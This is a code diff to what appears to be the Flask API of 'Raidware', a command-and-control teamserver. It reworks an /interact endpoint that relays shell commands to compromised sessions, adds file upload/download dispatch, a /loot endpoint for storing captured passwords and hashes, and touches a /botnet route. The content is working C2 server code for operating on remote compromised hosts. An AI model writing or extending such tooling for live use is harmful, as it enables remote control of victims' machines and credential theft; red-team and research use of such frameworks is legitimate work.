@@ -11,7 +11,7 @@ import Teamserver.Raidware as Raidware
 from Teamserver.listeners import connections
 from .db.actions import LocalJWT, UserManager, get_user
 from .db.models.user import User
-from .db import __init__ as db_init
+# from .db import __init__ as db_init
 from utils.logger import *
 from utils.utils import *
 from utils.crypto import SHA512
@@ -298,7 +298,6 @@ def prepare_listener():
                 'msg': 'Failed to prepare listener'
             }, 400
     
-        log(f"Prepared a TCP Listener: {listener}", LogLevel.INFO)
         return listener
 
     except Exception as E:
@@ -461,7 +460,7 @@ def disable():
             "msg" : f'Error: {E}'
         }, 400
 
-@bp.route(f'/delete', methods=['DELETE'])
+@bp.route(f'/delete', methods=['DELETE', 'POST'])
 @jwt_required()
 def delete():
     from utils.utils import enabled_listeners
@@ -634,9 +633,10 @@ def refresh():
         'access_token': create_access_token(identity=current_user)
     }
 
-@bp.route(f'/logout', methods=['POST', 'DELETE'])
+@bp.route(f'/logout', methods=['GET', 'POST'])
 @jwt_required()
 def logout():
+    log("Inside this function")
     name = get_jwt_identity()
     jti = get_jwt()['jti']
     log(f"Logged out {name}", LogLevel.INFO)
@@ -645,7 +645,7 @@ def logout():
     res.set_cookie('access_token', '')
     return res
 
-@bp.route(f'/logout_refresh', methods=['POST', 'DELETE'])
+@bp.route(f'/logout_refresh', methods=['POST'])
 @jwt_required(refresh=True)
 def logout_refresh():
     name = get_jwt_identity()
@@ -665,30 +665,24 @@ def logout_refresh():
 @bp.route(f'/sessions', methods=['GET'])
 @jwt_required()
 def sessions():
+    data = [connections[i].__dict__() for i in connections.keys()]
+    sessions = []
+
+    for item in data:
+        for val in item.values():
+            sessions.append(val)
+
     return {
         'status': 'success',
-        'sessions': [connections[i].__dict__() for i in connections.keys()]
+        'sessions': sessions
     }
     
 @bp.route(f'/interact', methods=['POST'])
 @jwt_required()
 def interact():
     
-    def shell(**kwargs):
-        print(kwargs)
-        ''' Sending the command to the session '''
-        session.send(f'{data["mode"]}:{data["payload"]}')
-        ret = session.recv()
-        
-        if data["payload"][:2].lower() == "cd":
-            session.pwd = ret
-
-        return {
-            'status': 'success',
-            'msg': ret
-        }
-    
     def upload(**kwargs):
+        print("Kwargs: ", kwargs)
         return {
             'status': 'success',
             'msg': 'File Uploaded Successfully!'
@@ -698,6 +692,40 @@ def interact():
         return {
             'status': 'success',
             'msg': 'File Downloaded Successfully!'
+        }
+
+    def shell(**kwargs):
+        print(kwargs)
+        ''' Sending the command to the session '''
+        try:
+            __check = data["payload"].split()[0].lower()
+        except:
+            return {
+                'status': 'error',
+                'msg': 'Invalid command'
+            }
+        
+        if __check == "put" or __check == "upload":
+            return upload(**kwargs)
+        
+        if __check == "get" or __check == "download":
+            return download(**kwargs)
+
+        session.send(f'{data["mode"]}:{data["payload"]}')
+        ret = session.recv()
+        
+        if data["payload"][:2].lower() == "cd":
+            session.pwd = ret
+            
+        if 'Connection Lost' in ret:
+            return {
+                'status': 'error',
+                'msg': ret
+            }, 400
+            
+        return {
+            'status': 'success',
+            'msg': ret
         }
 
     modes = {
@@ -753,6 +781,88 @@ def interact():
         }, 400
     
     return modes[data.get('mode')](**data)
+
+@bp.route(f'/users', methods=['GET'])
+@jwt_required()
+def users():
+    ''' This method will return a list of users '''
+    return {
+        'status': 'success',
+        'users': UserManager().get_pub_users()
+    }
+@bp.route('/stats/sessions', methods=['GET'])
+def get_sessions():
+    pass
+
+@bp.route(f'/loot', methods=['GET', 'POST'])
+@jwt_required()
+def loot():
+    if request.method == 'GET':
+        return {
+            'status': 'success',
+            'loot': Raidware.get_loot()
+        }
+    else:
+        from .db.actions import LootManager
+    from .db.models.Loot import Loot
+    ''' This method will add loot '''
+    try:
+        content_type = request.headers.get('Content-Type')
+        if content_type == 'application/json':
+            data = request.json
+        else:
+            data = request.form.to_dict()
+
+        if data == None or data == {}:
+            return {
+                'status': 'error',
+                'msg': 'No data provided'
+            }, 400
+
+        ''' Checking if the fields are present '''
+        if not data.get('type'):
+            return {
+                'status': 'error',
+                'msg': '"type" field is missing'
+            }, 400
+
+        if not data.get('value'):
+            return {
+                'status': 'error',
+                'msg': '"value" field is missing'
+            }, 400
+
+        if not data.get('description'):
+            return {
+                'status': 'error',
+                'msg': '"description" field is missing'
+            }, 400
+
+        types = ('password', 'hash')
+
+        ''' Checking if the type is valid '''
+        if data.get('type').lower() not in types:
+            return {
+                'status': 'error',
+                'msg': 'Invalid type specified. Only hash or password allowed'
+            }, 400
+        
+        ''' Adding the loot '''
+        if not LootManager.add_loot(Loot(name=data.get('name'), _type=data.get('type'), value=data.get('value'), description=data.get('description'))):
+            return {
+                'status': 'error',
+                'msg': 'Failed to add loot'
+            }, 400
+
+        return {
+            'status': 'success',
+            'msg': 'Loot added successfully'
+        }
+    except Exception as E:
+        return {
+            "status" : "error",
+            "msg" : f'Error: {E}'
+        }, 400
 
 @bp.route(f'/botnet', methods=['POST'])
 @jwt_required()
